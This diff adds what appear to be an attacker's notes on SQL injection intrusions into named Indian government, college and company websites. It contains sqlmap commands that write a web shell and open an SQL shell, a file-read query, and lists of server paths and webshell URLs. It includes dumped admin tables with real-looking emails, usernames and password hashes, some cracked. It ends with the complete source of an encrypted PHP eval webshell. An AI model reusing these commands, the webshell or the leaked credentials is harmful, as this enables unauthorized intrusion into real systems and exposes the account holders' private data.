@@ -88,3 +88,169 @@ Connection: close
 
 
 
+关注ip
+10.15.52.254
+172.24.51.228
+
+172.24.13.95
+
+ --tamper=between,randomcase,space2comment
+select @@datadir
+select @@Database
+
+select @@secure_file_priv
+
+select @@secure_file_priv
+
+sqlmap -u "http://x.x.x.x/?id=x" --file-write="/path/to/shell.php" --file-dest="/var/www/html/test/shell.php"
+
+wap.012395.com/e/action/showinfo/db_configs.php
+https://iamwarm.gov.in/adminlogin.aspx
+
+
+
+https://coa.gov.in/app/admin/login.php
+
+[15:17:24] [INFO] starting 8 processes
+[15:17:32] [WARNING] no clear password(s) found
+Database: coa_30
+Table: app_admin
+[1 entry]
++---------+------------+-----------------------------+---------+----------------+----------+----------+----------+----------------------------------+---------------------+
+| user_id | session_id | email                       | clr_pwd | ip_addr        | status   | entry_by | username | password                         | entry_date          |
++---------+------------+-----------------------------+---------+----------------+----------+----------+----------+----------------------------------+---------------------+
+| 1       | 29532648   | sanjaykumar_comat@yahoo.com |         | 42.108.169.152 | Active   | 0        | admin    | 95228f3702f78bbb4cbbd356a01a5e2b | 2023-09-01 11:47:03 |
++---------+------------+-----------------------------+---------+----------------+----------+----------+----------+----------------------------------+---------------------+
+
+[15:17:32] [INFO] table 'coa_30.app_admin' dumped to CSV file '/var/root/.local/share/sqlmap/output/coa.gov.in/dump/coa_30/app_admin.csv'
+[15:17:32] [INFO] fetched data logged to text files under '/var/root/.local/share/sqlmap/output/coa.gov.in'
+
+============================
+https://ocat.in/
+
+ d:\RcOnlineDemo\www\App_Code
+
+https://curriculum.msbte.ac.in/
+ /home/msbteac/public_html/curriculum/msbteacmon/curdev/admin/online_teaching_
+============================
+
+dbkncollege.co.in
+c:\HostingSpaces\admin\dbkncollege.co.in\wwwroot\App_Code
+
+============================
+gcwhisar.ac.in
+C:\inetpub\wwwroot\CollegeWebsite\App\
+
+
+https://remotexs.in
+/var/www/eclat_ws/sites/all/modules/contrib/
+============================
+sqlmap.py -r test/apsfl.in.dic --random-agent --risk 3 -D apsflin_mokshar -T admin --sql-shell --threads=10 --hex
+
+comments=555&contact=&email=0*&name=GRLpGpAG&phone=555-666-0606&subject=1
+current user is DBA: True
+
+============================
+
+https://srws.in/info.php
+
+
+============================
+https://indiacements.co.in/info.php
+
+https://indiacements.co.in/admin/login.php
+https://indiacements.co.in/phpMyAdmin/index.php
+
+C:\\inetpub\\wwwroot\\indiacements\\images
+C:\inetpub\wwwroot\indiacements\images
+C:\\inetpub\\temp\\apppools\\indiacements.co.in\\
+
+C:\\inetpub\\wwwroot\\indiacements\\uploads\\admin
+C:\\ProgramData\\MySQL\\MySQL Server 5.5\\Data\\'
+
+LOAD DATA INFILE 'C:\\inetpub\\wwwroot\\indiacements\\index.php' INTO TABLE testfile FIELDS TERMINATED BY 'fuck' (filein)
+
+Database: icl_demo
+Table: m_adminusers
+[2 entries]
++---------+--------------------+-------+---------+--------+---------------------+----------+------------------------------------------+--------------------+-----------+---------------------------------------------------+---------------------+-------------+
+| adminid | email              | fname | lname   | logged | created             | status   | password                                 | username           | admintype | adminimage                                        | last_login          | logout_time |
++---------+--------------------+-------+---------+--------+---------------------+----------+------------------------------------------+--------------------+-----------+---------------------------------------------------+---------------------+-------------+
+| 1       | coromandel@icl.com | Admin | <blank> | 0      | 2023-08-31 21:02:31 | 1        | f78ea0aa6c5f54caee31368283cdd62f         | coromandel@icl.com | 1         | 14526615943AbstractDancingIcon-e1284976045401.jpg | 2023-08-31 21:02:31 | 8388607     |
+| 79      | admin              | admin | P M     | 0      | 2016-11-28 18:04:31 | 2        | 21232f297a57a5a743894a0e4a801fc3 (admin) | admin              | 1         | 147409634111cxI9s9-1280x800.jpg                   | 2016-11-28 17:58:20 | 0           |
++---------+--------------------+-------+---------+--------+---------------------+----------+------------------------------------------+--------------------+-----------+---------------------------------------------------+---------------------+-------------+
+
+[16:29:13] [INFO] table 'icl_demo.m_adminusers' dumped to CSV file '/root/.local/share/sqlmap/output/indiacements.co.in/dump/icl_demo/m_adminusers.csv'
+[16:29:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/indiacements.co.in'
+
+
+Database: iclsugar
+Table: dbs_adminusers
+[2 entries]
++---------+------------------------------+---------------+--------+------------------+----------+------------------------------------------+-----------------+-----------+-------------+
+| adminid | email                        | name          | logged | created          | status   | password                                 | username        | admintype | logout_time |
++---------+------------------------------+---------------+--------+------------------+----------+------------------------------------------+-----------------+-----------+-------------+
+| 1       | thulasiram.pixel@gmail.com   | Administrator | 0      | 2011-12-30 12:24 | 1        | f78ea0aa6c5f54caee31368283cdd62f         | coromandeladmin | 1         | 1660649312  |
+| 31      | websupport@pixel-studios.com | Pixel Admin   | 1      | 2016-12-16 11:10 | 1        | 827ccb0eea8a706c4c34a16891f84e7b (12345) | pixeladmin      | 1         | 1519970600  |
++---------+------------------------------+---------------+--------+------------------+----------+------------------------------------------+-----------------+-----------+-------------+
+
+[16:38:29] [INFO] table 'iclsugar.dbs_adminusers' dumped to CSV file '/root/.local/share/sqlmap/output/indiacements.co.in/dump/iclsugar/dbs_adminusers.csv'
+[16:38:29] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/indiacements.co.in'
+
+
+https://nielitagtadmission.in
+
+
+
+
+https://gfcollege.in
+Database: gfcollege
+Table: login
+[2 entries]
+
+
+
+
+
+616137.com/attachment/foucs/base.php   getwd=adminx
++----------+---------------+----------------------------------+-----------+------------+
+| login_id | department_id | password                         | user_name | login_type |
++----------+---------------+----------------------------------+-----------+------------+
+| 1        | 0             | d2f33345ab3e7d9e54e3fbe327b28b6d | admin     | 1          |
+| 29       | 16            | f535e0914128c4a405909a0caefba0db | MROBOT    | 2          |
++----------+---------------+----------------------------------+-----------+------------+
+
+[16:57:57] [INFO] table 'gfcollege.login' dumped to CSV file '/root/.local/share/sqlmap/output/gfcollege.in/dump/gfcollege/login.csv'
+[16:57:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/gfcollege.in'
+
+[16:59:40] [INFO] fetching SQL SELECT statement query output: 'select @@datadir'
+select @@datadir: '/var/lib/mysql_data/6/'
+
+fuslai.com/dd.php
+<?php
+@error_reporting(0);
+session_start();
+
+    $key="faba3e98e029c12e"; 
+	$_SESSION['k']=$key;
+	$post=file_get_contents("php://input");
+	if(!extension_loaded('openssl'))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p."");}}
+    @call_user_func(new C(),$params);
+?>
+
